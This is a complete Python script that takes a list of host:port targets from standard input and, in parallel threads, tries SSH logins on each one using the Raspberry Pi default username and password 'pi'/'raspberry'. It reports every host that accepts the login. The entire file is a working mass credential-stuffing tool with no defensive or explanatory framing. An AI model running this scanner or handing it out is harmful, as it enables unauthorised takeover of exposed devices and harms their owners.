import os
import sys
import paramiko
import threading

PARAMIKO_LOGGING = False

if PARAMIKO_LOGGING:
    LOG_DIR = './log/'
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
    paramiko.util.log_to_file(LOG_DIR + 'paramiko.log')

def attempt_login(host, port):
    USER = 'pi'
    PASS = 'raspberry'
    TIMEOUT = 10

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=int(port), username=USER, password=PASS, allow_agent=False, look_for_keys=False, timeout=TIMEOUT)
        sys.stdout.write(host + ':' + port + '\n')
        sys.stdout.flush()
        ssh.close()
    except Exception as e:
        sys.stderr.write(host + ':' + port + ': ' + str(e) + '\n')
        sys.stderr.flush()

def brute_force():
    for line in sys.stdin.readlines():
        pi = line.split(':')
        (host, port) = (pi[0], pi[1].replace('\n', ''))
        t = threading.Thread(target=attempt_login, args=(host, port))
        t.Daemon = True
        t.start()

if __name__ == '__main__':
    brute_force()
